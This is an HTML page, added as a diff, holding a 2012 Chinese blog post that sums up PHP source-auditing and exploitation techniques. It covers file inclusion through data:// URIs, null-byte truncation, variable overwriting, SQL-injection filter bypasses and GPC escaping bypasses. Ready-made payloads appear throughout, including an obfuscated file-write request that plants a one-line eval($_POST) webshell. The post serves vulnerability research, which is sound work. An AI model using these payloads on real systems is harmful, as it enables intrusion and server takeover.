@@ -1,0 +1,265 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>一些php源码审计与利用技巧 - Ourren</title>
+  <meta name="author" content="ourren">
+
+  
+  <meta name="description" content="花了一些时间翻阅了wolvez中源码审计帖子，发现里面很多关于文件包含的漏洞，当然还有很多高级利用帖子。总体来说又扩充了一下关于php漏洞挖掘方面的思路，先总结如下： 1、文件包含
+原来有介绍文件包含（http://www.ourren.com/blog/file-contains-the- &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.ourren.com/blog/2012/04/16/some_of_php_audit_skills/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ourren</a></h1>
+  
+    <h2>关注技术，记录生活.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+    <li><a href="/">Home</a></li>
+    <li><a href="http://www.ourren.com">Ourren</a></li>
+    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">一些php源码审计与利用技巧</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-04-16T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>花了一些时间翻阅了wolvez中源码审计帖子，发现里面很多关于文件包含的漏洞，当然还有很多高级利用帖子。总体来说又扩充了一下关于php漏洞挖掘方面的思路，先总结如下：</p>
+
+<p>1、文件包含
+原来有介绍文件包含（<a href="http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html</a> ），其实当时候总结的还不是很全，还有几点需要补充的。
+查找思路：先找到哪些文件中include，require函数中包含有可控制的变量，然后看哪些文件包含了这个文件。
+利用：
+条件：在allow_url_include = On且PHP >= 5.2.0的条件下
+利用的时候采用data://或者php://input是一个不错的选择
+[code lang=&ldquo;php&rdquo;]x.php?path=data://text/plain;base64,PD9waHBpbmZvKCk7Lyo=
+x.php?path=data:;base64,PD9waHBpbmZvKCk7Lyo=
+x.php?inc=data:;base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=   //phpinfo()[/code]
+截断方式：
+%00(GPC开启时会转义)  长文件名（///////)
+注：php5.3.4以后已经修复了%00漏洞</p>
+
+<p>包含tmp文件夹下文件：
+注上传一个webshell到/tmp文件夹下包含（../../../x.php）。</p>
+
+<p>2、变量覆盖
+条件：需要开启register_globals（php5.4已删除，见此文<a href="http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html">http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html</a> ），有时候还可能会考虑GPC。
+数组未初始化覆盖技巧蛮多的。
+新认识的函数：parse_str</p>
+
+<p>3、注入关键字过滤
+&lsquo;    %2%277  过滤%27时，针对str_replace过滤关键字符，其他过滤方式结合具体情况
+&#8216;    %2527  针对urldecode()函数
+空格  ()替代空格的方法绕过：union(select(password),2,3,4,5,6,7,8,9,0,1+from+[zt_admin])</p>
+
+<p>4、文件写操作
+两种比较好的利用代码：
+字符写文件
+[code lang=&ldquo;php&rdquo;]hxxp://www.xxx.com/error.php?errid=1&amp;errtitle=&lt;?fputs(fopen(chr(119).chr(111).chr(108).chr(118).chr(101).chr(122).chr(46).
+chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112).chr(104).
+chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59).chr(63).chr(62));?&gt;[/code]
+这样你在访问一次hxxp://www.xxx.com/data/error.php 后将得到 hxxp://www.xxx.com/data/wolvez.php 的测试文件
+内容为&lt;?phpinfo():?>l</p>
+
+<p>双引号（base64）写文件，然后包含执行
+<a href="http://$">http://$</a>{${fputs(fopen(base64_decode(ZmwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9Q
+T1NUW2FdKTsgPz4x))}}
+上面这段代码是将 &lt;?php @eval($_POST[a]); ?>1 到fl.php文件。利用base64_encode编码避免了使用单引号，所以无须考虑gpc的影响。注意，在字符串不包括 + =等特殊符号的情况下，base64_decode的参数是无须使用单引号或者双银引号的。</p>
+
+<p>5、GPC绕过
+$_SERVER数组不受GPC影响。
+GPC与substr组合：有些地方经过GPC转义后，其他地方有可能用substr进行取值，这时候恰好把&#8217;&lsquo;去掉。
+数据库（文本）中转：
+[code lang=&ldquo;php&rdquo;][注意存入数据库和select出的数据]
+用户输入===&gt;gpcaddslashes()==========&gt;数据库=========&gt;执行sql语句include写入缓存文件
+insertupdate                 select
+编码：
+UTF-7(+ACc-)===&gt;gpcaddslashes()===&gt;mb_convert_encoding()===&gt;UTF-8(&rsquo;)
+0xbf27===&gt;gpcaddslashes()===&gt;0xbf5c27===&gt;执行sql语句[数据库编码支持多字节][/code]
+参考：
+<a href="http://bbs.wolvez.org/viewtopic.php?id=20">http://bbs.wolvez.org/viewtopic.php?id=20</a>
+<a href="http://www.xfocus.net/articles/200608/878.html">http://www.xfocus.net/articles/200608/878.html</a>
+<a href="http://www.ourren.com/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/file-contains-the-summary-into-the-use-of.html</a>
+<a href="http://bbs.wolvez.org">http://bbs.wolvez.org</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">ourren</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2012-04-16T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/categories/security/'>security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2012/04/11/zend_record_login_info/" title="Previous Post: zend框架记录登陆信息">&laquo; zend框架记录登陆信息</a>
+      
+      
+        <a class="basic-alignment right" href="/2012/04/16/some_of_statistical_sql/" title="Next Post: 数据统计的一些语句">数据统计的一些语句 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+<section>
+    <div id="comments" aria-live="polite"><!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-title="一些php源码审计与利用技巧"></div>
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ourren"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+<!-- Duoshuo Comment END --></div>
+</section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+    <h1>分类目录</h1>
+    <ul>
+        <li>
+            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
+        </li>
+        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
+        </li>
+    </ul>
+</section><section>
+    <h1>友情链接</h1>
+    <ul>
+        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
+        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
+        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
+        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
+        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
+    </ul>
+</section>
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - ourren -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
